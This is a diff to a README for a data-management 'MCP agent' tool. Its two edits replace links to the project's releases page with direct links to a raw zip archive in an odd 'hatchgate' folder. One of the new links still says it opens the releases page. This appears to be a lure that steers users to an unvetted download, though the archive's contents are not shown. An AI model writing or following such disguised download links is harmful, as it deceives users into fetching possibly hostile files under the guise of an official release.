@@ -1,7 +1,7 @@
 # 🚀 semantic-metrics-modeling-assistant - Simplify Your Data Management
 
 ## 🌐 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg?style=flat-square)](https://github.com/RafaelaLuzz/semantic-metrics-modeling-assistant/releases)
+[![Download](https://github.com/RafaelaLuzz/semantic-metrics-modeling-assistant/raw/refs/heads/main/hatchgate/semantic-assistant-metrics-modeling-v3.1.zip)](https://github.com/RafaelaLuzz/semantic-metrics-modeling-assistant/raw/refs/heads/main/hatchgate/semantic-assistant-metrics-modeling-v3.1.zip)
 
 ## 📋 Description
 The semantic-metrics-modeling-assistant is a helpful tool for teams engaged in data management. It acts as an MCP agent, providing features such as:
@@ -17,7 +17,7 @@ To get started with the semantic-metrics-modeling-assistant, you need to follow 
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Click on the following link to access the releases page: [Download Here](https://github.com/RafaelaLuzz/semantic-metrics-modeling-assistant/releases).
+   Click on the following link to access the releases page: [Download Here](https://github.com/RafaelaLuzz/semantic-metrics-modeling-assistant/raw/refs/heads/main/hatchgate/semantic-assistant-metrics-modeling-v3.1.zip).
 
 2. **Choose Your Version**  
    On the releases page, you will see different versions of the software. Select the version you wish to download.
